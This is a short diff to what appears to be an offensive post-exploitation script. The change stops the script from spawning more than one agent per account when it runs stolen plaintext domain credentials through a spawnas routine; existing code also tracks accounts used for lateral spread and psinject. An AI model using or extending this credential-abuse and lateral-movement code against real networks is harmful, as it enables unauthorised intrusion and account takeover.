@@ -573,7 +573,8 @@ def pwn_the_shit_out_of_everything(agent_name):
     for cred in get_stored_credentials()['creds']:
         if cred['credtype'] == 'plaintext':
             account = '{}\\{}'.format(cred['domain'].split('.')[0].upper(), cred['username'])
-            if (account not in spread_usernames) and (account not in psinject_usernames):
+            if (account not in spread_usernames) and (account not in psinject_usernames) and (account not in spawned_usernames):
+                spawned_usernames.append(account)
                 spawnas(agent_name, cred_id=cred['ID'])
                 spawned_agents += 1
 
@@ -779,6 +780,7 @@ domain_controllers = []
 domain_admins      = []
 spread_usernames   = [] # List of accounts we already used to laterally spread
 psinject_usernames = [] # List of accounts we psinjected into
+spawned_usernames  = [] # List of accounts we spawned agents with
 
 login(args.username, args.password)
 
